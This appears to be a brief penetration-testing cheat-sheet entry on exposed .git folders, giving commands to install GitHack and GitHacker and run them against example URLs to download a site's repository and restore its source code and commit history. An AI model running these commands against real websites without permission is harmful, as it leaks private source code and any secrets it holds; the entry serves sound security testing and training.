In case .git folder is found:
```bash
git clone https://github.com/lijiejie/GitHack.git && cd GitHack

python GitHack.py http://example.com/.git/
```
This will download .git folder and restore source code.

More powerfull tool (supports git commit history):
```bash
python3 -m pip install -i https://pypi.org/simple/ GitHacker

githacker --url http://127.0.0.1/.git/ --output-folder result
```